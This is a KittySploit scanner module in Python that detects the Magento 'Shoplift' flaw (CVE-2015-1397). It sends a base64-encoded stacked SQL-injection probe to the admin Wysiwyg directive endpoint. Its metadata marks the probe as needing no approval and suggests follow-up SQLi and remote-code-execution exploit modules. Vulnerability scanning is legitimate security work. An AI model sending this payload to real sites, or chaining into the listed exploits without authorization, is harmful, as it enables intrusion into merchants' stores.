#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magento CE CVE-2015-1397 Shoplift SQLi surface detect."""

import base64

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Magento CVE-2015-1397 Shoplift Detect",
        "description": (
            "Fingerprints Magento and probes Cms_Wysiwyg/directive/index "
            "for SUPEE-5344 missing (stacked SQLi sink)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2015-1397"],
        "tags": ["web", "scanner", "magento", "sqli", "cve-2015-1397"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-1397"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/magento_cve_2015_1397_shoplift",
                    "exploits/multi/http/magento_cve_2015_1398_rce",
                ],
            },
        },
    }

    def run(self):
        r = self.http_request("GET", "/")
        body = (r.text or "").lower() if r else ""
        if "magento" not in body and "mage" not in body:
            return False
        directive_b64 = base64.b64encode(
            b"{{block type=Adminhtml/report_search_grid output=getCsvFile}}"
        ).decode()
        probe_filter = base64.b64encode(
            b"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SELECT SLEEP(0)-- "
        ).decode()
        r2 = self.http_request(
            "POST",
            "/index.php/admin/Cms_Wysiwyg/directive/index/",
            data={"___directive": directive_b64, "filter": probe_filter, "forwarded": "1"},
        )
        code = int(r2.status_code or 0) if r2 else 0
        if code in (200, 500):
            self.set_info(
                severity="critical",
                cve="CVE-2015-1397",
                reason="Magento Wysiwyg directive accepts filter (Shoplift class)",
                confidence="medium",
            )
            return True
        return False
